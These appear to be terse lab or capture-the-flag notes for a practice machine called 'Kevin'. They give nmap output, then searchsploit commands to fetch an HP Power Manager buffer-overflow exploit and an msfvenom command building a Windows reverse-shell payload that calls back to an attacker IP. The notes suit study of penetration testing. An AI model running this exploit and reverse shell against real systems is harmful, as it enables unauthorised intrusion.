# Kevin
# date 4-8-2023
# 192.168.207.45
# buffer overflow

# nmap 
PORT      STATE SERVICE            VERSION
80/tcp    open  http               GoAhead WebServer
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC

# exploitaion

└─$ searchsploit hp power manager
└─$ searchsploit -m windows/remote/10099.py
192.168.207.45

msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.49.100 LPORT=80 -e x86/alpha_mixed -f c

We can replace everything in the SHELL variable of exploit script after n00bn00b with our own code, open a listener and run the exploit to get a reverse shell back as root.

